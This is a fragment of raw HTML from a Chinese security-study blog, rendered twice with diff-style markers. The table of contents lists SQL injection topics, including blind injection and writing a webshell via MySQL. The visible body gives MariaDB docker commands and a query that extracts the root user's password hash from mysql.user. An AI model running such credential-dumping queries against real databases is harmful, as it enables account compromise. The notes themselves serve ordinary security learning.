href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">写入文件</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/29/SQL%E7%BB%95%E8%BF%87/" title="SQL绕过">SQL绕过</a><time datetime="2025-01-29T09:34:11.000Z" title="Created 2025-01-29 17:34:11">2025-01-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/29/SQL-labs/" title="SQL-labs">SQL-labs</a><time datetime="2025-01-29T09:31:20.000Z" title="Created 2025-01-29 17:31:20">2025-01-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/26/PHP/" title="PHP">PHP</a><time datetime="2025-01-26T07:15:25.000Z" title="Created 2025-01-26 15:15:25">2025-01-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/24/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="SQL注入漏洞">SQL注入漏洞</a><time datetime="2025-01-24T13:30:35.000Z" title="Created 2025-01-24 21:30:35">2025-01-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/" title="文件上传漏洞靶场">文件上传漏洞靶场</a><time datetime="2025-01-22T15:06:03.000Z" title="Created 2025-01-22 23:06:03">2025-01-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By xdzjldy</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+<h1 id="MariaDB"><a href="#MariaDB" class="headerlink" title="MariaDB"></a>MariaDB</h1><p><code>docker mariadb</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`docker search mariadb`</span><br><span class="line">`docker pull mariadb`</span><br><span class="line">`docker exec -it 9ce9d8505a1d bash`</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><p>查找所有用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`select group_concat(user) from mysql.user;`</span><br></pre></td></tr></table></figure>
+
+<p>用户hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`select group_concat(password) from mysql.user where user=&#x27;root&#x27;`</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://xdzjldy.github.io">xdzjldy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://xdzjldy.github.io/2025/01/29/SQL%E7%BB%95%E8%BF%87/">https://xdzjldy.github.io/2025/01/29/SQL%E7%BB%95%E8%BF%87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/5.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/01/29/BypassWaf-sql/" title="BypassWaf_sql"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">BypassWaf_sql</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/5.jpg'" alt="avatar"/></div><div class="author-info__name">xdzjldy</div><div class="author-info__description">弃燕雀之小志，慕鸿鹄以高翔</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.</span> <span class="toc-text">漏洞的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B7%E4%BD%93%E5%88%A4%E6%96%AD%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入的具体判断流程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%AE%9A%E4%BD%8D%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.1.2.</span> <span class="toc-text">数据定位查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.3.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.4.</span> <span class="toc-text">读写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E8%BF%90%E5%8A%A8"><span class="toc-number">1.1.5.</span> <span class="toc-text">横向运动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.6.</span> <span class="toc-text">数据泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">普通查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">判断漏洞是否存在</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">数字型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">字符型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E5%90%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">爆库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">1.2.4.</span> <span class="toc-text">爆表名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#floor"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">floor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml%EF%BC%9Aupdatexml-xml-doument-XPath-string-new-value"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">updatexml：updatexml(xml_doument,XPath_string,new_value)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.3.0.4.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Boolean%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Boolean盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Partial-Blind"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">Partial-Blind</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Full-Blind"><span class="toc-number">1.4.0.4.</span> <span class="toc-text">Full-Blind</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E5%86%99webshell"><span class="toc-number">1.4.1.</span> <span class="toc-text">MySQL写webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">写入文件</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MariaDB"><span class="toc-number">2.</span> <span class="toc-text">MariaDB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.0.1.</span> <span class="toc-text">常用语句</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/29/SQL%E7%BB%95%E8%BF%87/" title="SQL绕过">SQL绕过</a><time datetime="2025-01-29T13:10:11.000Z" title="Created 2025-01-29 21:10:11">2025-01-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/29/BypassWaf-sql/" title="BypassWaf_sql">BypassWaf_sql</a><time datetime="2025-01-29T13:09:09.000Z" title="Created 2025-01-29 21:09:09">2025-01-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/29/SQL-labs/" title="SQL-labs">SQL-labs</a><time datetime="2025-01-29T09:31:20.000Z" title="Created 2025-01-29 17:31:20">2025-01-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/26/PHP/" title="PHP">PHP</a><time datetime="2025-01-26T07:15:25.000Z" title="Created 2025-01-26 15:15:25">2025-01-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/24/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="SQL注入漏洞">SQL注入漏洞</a><time datetime="2025-01-24T13:30:35.000Z" title="Created 2025-01-24 21:30:35">2025-01-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By xdzjldy</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
